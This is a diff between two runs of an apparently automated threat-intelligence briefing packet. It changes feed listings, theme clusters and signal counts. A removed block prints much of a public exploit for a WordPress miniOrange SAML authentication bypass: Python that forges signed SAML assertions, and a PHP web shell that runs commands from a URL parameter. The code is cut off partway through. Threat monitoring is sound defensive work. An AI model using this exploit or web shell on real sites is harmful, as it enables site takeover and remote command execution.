@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-09-06T23:41:58.422694+00:00
+- Generated: 2026-09-07T04:03:16.374203+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 75
-- Total items in window: 426
-- Total clusters raw: 201
-- Total clusters in packet: 79
-- Dropped low score: 122
+- Total items in window: 414
+- Total clusters raw: 199
+- Total clusters in packet: 78
+- Dropped low score: 121
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -85,6 +85,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+  - Status: ok
+  - Item count: 25
+  - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
@@ -95,71 +100,66 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
-  - Item count: 25
-  - In window count: 0
+  - Item count: 10
+  - In window count: 3
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
   - Item count: 0
-  - In window count: 0
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
   - In window count: 0
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 3
+  - Item count: 20
+  - In window count: 0
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **SANS Internet Storm Center** (government_authoritative)
-  - URL: https://isc.sans.edu/rssfeed_full.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
+- **SANS Internet Storm Center** (government_authoritative)
+  - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
-  - Item count: 15
-  - In window count: 1
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 2
+  - Item count: 10
+  - In window count: 9
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
   - In window count: 3
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - Item count: 100
+  - In window count: 2
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 7
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 1
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
@@ -170,46 +170,46 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
-  - Item count: 78
-  - In window count: 0
+  - Item count: 50
+  - In window count: 15
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
   - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
-  - Item count: 50
-  - In window count: 23
+  - Item count: 78
+  - In window count: 0
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
   - Item count: 15
-  - In window count: 0
-- **The DFIR Report** (detection_response_operations)
-  - URL: https://thedfirreport.com/feed/
-  - Status: ok
-  - Item count: 10
   - In window count: 0
 - **Black Hills Information Security** (detection_response_operations)
   - URL: https://www.blackhillsinfosec.com/feed/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **TrustedSec** (detection_response_operations)
-  - URL: https://www.trustedsec.com/feed/
+- **The DFIR Report** (detection_response_operations)
+  - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 2
+  - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **TrustedSec** (detection_response_operations)
+  - URL: https://www.trustedsec.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -229,7 +229,7 @@
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
-  - In window count: 1
+  - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
@@ -240,6 +240,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
 - **AWS Security Blog** (cloud_identity_infrastructure)
   - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
@@ -250,13 +255,13 @@
   - Status: ok
   - Item count: 100
   - In window count: 2
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
   - Item count: 20
   - In window count: 1
@@ -264,12 +269,7 @@
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
-  - In window count: 4
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
+  - In window count: 3
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: parse_error
@@ -290,11 +290,6 @@
   - Status: ok
   - Item count: 100
   - In window count: 4
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
@@ -305,6 +300,11 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 3
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
@@ -315,16 +315,16 @@
   - Status: ok
   - Item count: 20
   - In window count: 17
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
@@ -335,6 +335,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
@@ -345,11 +350,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **AI Snake Oil** (ai_security_agentic_risk)
   - URL: https://www.aisnakeoil.com/feed
   - Status: ok
@@ -360,26 +360,26 @@
   - Status: ok
   - Item count: 50
   - In window count: 24
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Simon Willison** (ai_security_agentic_risk)
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
   - Item count: 30
   - In window count: 21
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 100
+  - Item count: 10
+  - In window count: 10
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 100
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
@@ -400,36 +400,36 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **The Hacker News** (cyber_news_breach_reporting)
   - URL: https://feeds.feedburner.com/TheHackersNews
   - Status: ok
   - Item count: 50
   - In window count: 50
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -473,29 +473,6 @@
 
 ## Affinity groups (themes)
 
-### WordPress active exploitation
-- Anchor signal: WordPress
-- Theme key: wordpress
-- Cluster count: 5
-- Article count: 6
-- Cohesion: 0.221
-- Shared strong signals: WordPress
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation
-  - affected_industries: government
-  - affected_products: WordPress
-  - urgency_signals: preauth_unauth, actively_exploited
-- Cluster IDs: d5d207ddf7, 6a5c697136, 64d5865aac, 9ebfca707c, d19603372e
-- Links:
-  - https://www.exploit-db.com/exploits/52668
-  - https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
-  - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
-  - https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
-  - https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
-  - https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
-
 ### ShinyHunters targeting Salesforce
 - Anchor signal: ShinyHunters
 - Theme key: shinyhunters
@@ -520,28 +497,6 @@
   - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
   - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
   - https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
-
-### Microsoft SharePoint active exploitation
-- Anchor signal: Microsoft SharePoint
-- Theme key: microsoft-sharepoint
-- Cluster count: 4
-- Article count: 6
-- Cohesion: 0.2
-- Shared strong signals: Microsoft SharePoint
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: ransomware_extortion, active_exploitation
-  - affected_products: Microsoft SharePoint
-  - urgency_signals: actively_exploited, poc_available
-- Cluster IDs: 6a5c697136, 71ed2ba3b0, 7c42269e48, d8c893e316
-- Links:
-  - https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
-  - https://www.helpnetsecurity.com/2026/09/04/september-2026-patch-tuesday-forecast/
-  - https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
-  - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
-  - https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/
-  - https://www.darkreading.com/cybersecurity-operations/what-we-missed-did-shinyhunters-breach-reliaquest
 
 ### Cl0p: ransomware extortion
 - Anchor signal: Cl0p
@@ -587,89 +542,32 @@
   - https://www.darkreading.com/vulnerabilities-threats/critical-langflow-flaw-exploited-attacks-rise
   - https://thehackernews.com/2026/09/attackers-exploit-critical-langflow-and.html
 
-### CVE-2026-2441 exploitation activity
-- Anchor signal: CVE-2026-2441
-- Theme key: cve-2026-2441
-- Cluster count: 2
-- Article count: 4
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-2441
+### Microsoft SharePoint vulnerability activity
+- Anchor signal: Microsoft SharePoint
+- Theme key: microsoft-sharepoint
+- Cluster count: 3
+- Article count: 5
+- Cohesion: 0.2
+- Shared strong signals: Microsoft SharePoint
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-85046
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: 5ff343317a, 64d5865aac
+  - affected_products: Microsoft SharePoint
+- Cluster IDs: 71ed2ba3b0, 7c42269e48, d8c893e316
 - Links:
-  - https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/
-  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
-  - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
+  - https://www.helpnetsecurity.com/2026/09/04/september-2026-patch-tuesday-forecast/
+  - https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
+  - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
+  - https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/
+  - https://www.darkreading.com/cybersecurity-operations/what-we-missed-did-shinyhunters-breach-reliaquest
 
-### CVE-2026-85046 exploitation activity
-- Anchor signal: CVE-2026-85046
-- Theme key: cve-2026-85046
-- Cluster count: 2
-- Article count: 4
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-85046
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-85046
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: 5ff343317a, 64d5865aac
-- Links:
-  - https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/
-  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
-  - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
-
-### CVE-2026-3909 exploitation activity
-- Anchor signal: CVE-2026-3909
-- Theme key: cve-2026-3909
-- Cluster count: 2
-- Article count: 4
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-3909
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-85046
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: 5ff343317a, 64d5865aac
-- Links:
-  - https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/
-  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
-  - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
-
-### CVE-2026-3910 exploitation activity
-- Anchor signal: CVE-2026-3910
-- Theme key: cve-2026-3910
-- Cluster count: 2
-- Article count: 4
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-3910
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-85046
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: 5ff343317a, 64d5865aac
-- Links:
-  - https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/
-  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
-  - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
-
-### CVE-2026-81578 exploitation activity
-- Anchor signal: CVE-2026-81578
-- Theme key: cve-2026-81578
+### CVE-2026-82078 exploitation activity
+- Anchor signal: CVE-2026-82078
+- Theme key: cve-2026-82078
 - Cluster count: 2
 - Article count: 3
 - Cohesion: 0.231
-- Shared strong signals: CVE-2026-81578
+- Shared strong signals: CVE-2026-82078
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -681,13 +579,13 @@
   - https://thehackernews.com/2026/09/attackers-exploit-papercut-flaws-to.html
   - https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
 
-### CVE-2026-82078 exploitation activity
-- Anchor signal: CVE-2026-82078
-- Theme key: cve-2026-82078
+### CVE-2026-81578 exploitation activity
+- Anchor signal: CVE-2026-81578
+- Theme key: cve-2026-81578
 - Cluster count: 2
 - Article count: 3
 - Cohesion: 0.231
-- Shared strong signals: CVE-2026-82078
+- Shared strong signals: CVE-2026-81578
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -715,6 +613,76 @@
   - https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/
   - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
   - https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/
+
+### ransomware extortion targeting Android
+- Anchor signal: Android
+- Theme key: android
+- Cluster count: 2
+- Article count: 2
+- Cohesion: 0.697
+- Shared strong signals: Android
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: ransomware_extortion
+  - affected_industries: financial_services
+  - affected_products: Android, OpenAI/ChatGPT
+- Cluster IDs: bbea7197be, 96362ad42a
+- Links:
+  - https://research.checkpoint.com/2026/gaming-the-system-how-a-chinese-speaking-actor-turned-brazilian-government-sites-into-an-seo-weapon/
+  - https://research.checkpoint.com/2026/breaking-the-seal-static-deobfuscation-of-jsceals-compiled-v8-bytecode/
+
+### phishing social eng targeting Microsoft Defender
+- Anchor signal: Microsoft Defender
+- Theme key: microsoft-defender
+- Cluster count: 2
+- Article count: 7
+- Cohesion: 0.24
+- Shared strong signals: Microsoft Defender
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: phishing_social_eng
+  - affected_products: Microsoft Defender
+- Cluster IDs: 1946cdc3c5, 2e696487bb
+- Links:
+  - https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
+  - https://thehackernews.com/2026/09/fake-software-installers-disable.html
+  - https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
+
+### GitLab vulnerability activity
+- Anchor signal: GitLab
+- Theme key: gitlab
+- Cluster count: 2
+- Article count: 3
+- Cohesion: 0.2
+- Shared strong signals: GitLab
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: GitLab
+- Cluster IDs: bfe3e974bb, 9f4e218d51
+- Links:
+  - https://horizon3.ai/customer-story/virginia-tech-automated-external-pentesting/
+  - https://www.reddit.com/r/netsec/comments/1w5hjc8/the_validator_can_lie_ssrf_beyond_url_validation/
+  - https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
+
+### WordPress vulnerability activity
+- Anchor signal: WordPress
+- Theme key: wordpress
+- Cluster count: 2
+- Article count: 3
+- Cohesion: 0.2
+- Shared strong signals: WordPress
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: WordPress
+- Cluster IDs: 9ebfca707c, d19603372e
+- Links:
+  - https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
+  - https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
+  - https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
 
 ## Forward signals
 
@@ -748,12 +716,12 @@
 - Pair: CVE-2026-85046 + Nimbus Manticore (cluster 5ff343317a, first observation: True)
 - Pair: CVE-2026-85046 + Apple iOS/macOS (cluster 5ff343317a, first observation: True)
 - Pair: Nimbus Manticore + Apple iOS/macOS (cluster 5ff343317a, first observation: True)
-- Pair: CVE-2026-15013 + WordPress (cluster d5d207ddf7, first observation: True)
 - Pair: CVE-2021-31886 + Anthropic/Claude (cluster 3f9d82bc63, first observation: True)
 - Pair: CVE-2021-31886 + GitHub (cluster 3f9d82bc63, first observation: True)
 - Pair: CVE-2021-31886 + OpenAI/ChatGPT (cluster 3f9d82bc63, first observation: True)
-- Pair: CVE-2026-19490 + Microsoft SharePoint (cluster 6a5c697136, first observation: True)
-- Pair: CVE-2026-19490 + WordPress (cluster 6a5c697136, first observation: True)
+- Pair: CVE-2026-55040 + Ivanti (cluster 71ed2ba3b0, first observation: True)
+- Pair: CVE-2026-62911 + Azure (cluster 71ed2ba3b0, first observation: True)
+- Pair: CVE-2026-62911 + Ivanti (cluster 71ed2ba3b0, first observation: True)
 
 ### Drift (5)
 - **ShinyHunters** (cluster d8c893e316)
@@ -787,17 +755,17 @@
 - actor_attribution: Scattered Spider (weeks observed: 10, cluster fc5c9992d3)
 - actor_attribution: LockBit (weeks observed: 8, cluster 439827e1a6)
 - actor_attribution: Cl0p (weeks observed: 7, cluster 498d32f5a8)
-- actor_attribution: APT29 (weeks observed: 6, cluster eae1569c42)
 - cve_ids: CVE-2025-3248 (weeks observed: 6, cluster 8370077906)
 - cve_ids: CVE-2026-55040 (weeks observed: 5, cluster 71ed2ba3b0)
+- actor_attribution: APT29 (weeks observed: 5, cluster eae1569c42)
 - actor_attribution: BlackCat/ALPHV (weeks observed: 5, cluster fc5c9992d3)
 - cve_ids: CVE-2026-19490 (weeks observed: 4, cluster 6a5c697136)
-- cve_ids: CVE-2026-11645 (weeks observed: 4, cluster 64d5865aac)
 - actor_attribution: Volt Typhoon (weeks observed: 4, cluster b9771fe2d2)
 - actor_attribution: Kimsuky (weeks observed: 4, cluster 93a2320bbc)
 - actor_attribution: RansomHub (weeks observed: 4, cluster fc5c9992d3)
 - actor_attribution: Nimbus Manticore (weeks observed: 3, cluster 5ff343317a)
-- cve_ids: CVE-2026-3055 (weeks observed: 3, cluster 6a5c697136)
+- cve_ids: CVE-2026-63520 (weeks observed: 3, cluster 71ed2ba3b0)
+- cve_ids: CVE-2024-36401 (weeks observed: 3, cluster 5f380a65c5)
 
 ### Tier inversion (1)
 - **Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Another**
@@ -1083,21 +1051,17 @@ Mikrotik released a patch late last week for an already-exploited vulnerability.
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-09-01T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52668
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_products: WordPress
-- cve_ids: CVE-2026-15013
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
-- affected_products: WordPress
-- cve_ids: CVE-2026-15013
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
@@ -1106,12 +1070,6 @@ Mikrotik released a patch late last week for an already-exploited vulnerability.
 
 ```
 miniOrange 5.4.3 - Unauthenticated Auth Bypass
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training miniOrange 5.4.3 - Unauthenticated Auth Bypass EDB-ID: 52668 CVE: 2026-15013 EDB Verified: Author: zer0dayf Type: webapps Exploit: / Platform: Multiple Date: 2026-09-01 Vulnerable App: # Exploit Title: miniOrange 5.4.3 - Unauthenticated Auth Bypass # Google Dork: inurl:/wp-content/plugins/miniorange-saml-20-single-sign-on/ # Date: 2026-07-27 # Exploit Author: zer0dayf # Vendor Homepage: https://plugins.wordpress.org/miniorange-saml-20-single-sign-on/ # Software Link: https://downloads.wordpress.org/plugin/miniorange-saml-20-single-sign-on.5.4.3.zip # Version: <= 5.4.3 # Tested on: WordPress 7.x + miniOrange SAML SSO 5.4.3 # CVE : CVE-2026-15013 """ CVE-2026-15013 — miniOrange SAML SSO <= 5.4.3 HMAC signature algorithm confusion Lab / authorized testing only. Flow: detect → enum users → fetch IdP cert → HMAC SAML → admin → shell → optional reverse """ from __future__ import annotations import argparse import base64 import hashlib import hmac import io import os import re import subprocess import sys import tempfile import uuid import zipfile from datetime import datetime, timedelta, timezone from pathlib import Path from urllib.parse import urlparse import requests from lxml import etree requests.packages.urllib3.disable_warnings() NS_SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol" NS_SAML = "urn:oasis:names:tc:SAML:2.0:assertion" NS_DS = "http://www.w3.org/2000/09/xmldsig#" C14N = "http://www.w3.org/2001/10/xml-exc-c14n#" ENVSIG = "http://www.w3.org/2000/09/xmldsig#enveloped-signature" HMAC_URI = "http://www.w3.org/2000/09/xmldsig#hmac-sha1" SHA1_URI = "http://www.w3.org/2000/09/xmldsig#sha1" PLUGIN_PATH = "/wp-content/plugins/miniorange-saml-20-single-sign-on/" VULN_MAX = (5, 4, 3) SHELL_PHP = r"""<?php /** * Plugin Name: exp * Version: 1.0 */ if (!isset($_GET["c"])) { header("Content-Type: text/plain"); echo "exp cmd shell\nUsage: ?c=id\n"; exit; } $c = $_GET["c"]; header("Content-Type: text/plain; charset=utf-8"); echo ">>> " . $c . "\n\n"; if (function_exists("shell_exec")) { echo shell_exec($c . " 2>&1"); } else { echo "no shell_exec\n"; } """ def norm(url: str) -> str: url = url.strip().rstrip("/") if not url.startswith(("http://", "https://")): url = "http://" + url return url def ver_tuple(s: str): try: return tuple(int(x) for x in s.split(".")[:3]) except Exception: return (0, 0, 0) def now_iso(m=0): return (datetime.now(timezone.utc) + timedelta(minutes=m)).strftime("%Y-%m-%dT%H:%M:%SZ") def session(): s = requests.Session() s.verify = False s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" return s def is_wp(s, base): for p in ("/wp-login.php", "/wp-json/", "/wp-includes/js/jquery/jquery.min.js"): try: if s.get(base + p, timeout=10).status_code == 200: return True except Exception: pass return False def detect_plugin(s, base): try: r = s.get(base + PLUGIN_PATH + "readme.txt", timeout=10) if r.status_code == 200: m = re.search(r"Stable tag:\s*(\S+)", r.text) if m: return m.group(1) except Exception: pass return None def discover_sp(s, base): acs, eid, issuer = base + "/", 